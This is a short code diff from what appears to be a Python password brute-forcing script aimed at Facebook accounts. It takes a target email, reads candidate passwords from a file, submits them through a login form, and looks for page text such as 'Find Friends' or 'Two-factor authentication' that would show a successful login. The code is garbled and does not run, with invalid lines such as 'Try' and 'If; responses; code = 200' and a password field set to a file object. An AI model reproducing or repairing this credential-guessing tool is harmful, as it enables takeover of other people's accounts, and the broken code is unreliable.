@@ -32,14 +32,14 @@ email= input('Enter Email/Username : ')
 print ("\nTarget Email ID : ",email)
 
 password = file.readlines()
-Password = password("\n")
+Password = ("password\n")
 print("[*] Trying: %s"%password)
 responses = browser.open(post_url)
 Try
 If; responses; code = 200
 browser.select_form(nr=0)
 browser.form['Email address or phone number'] = email
-browser.form['Password'] = Password
+browser.form['Password'] = file
 response = browser.submit()
 responses_data = responses.read()
 'Find Friends' in responses_data or 'Two-factor authentication' in responses_data or 'security code' in responses_data;
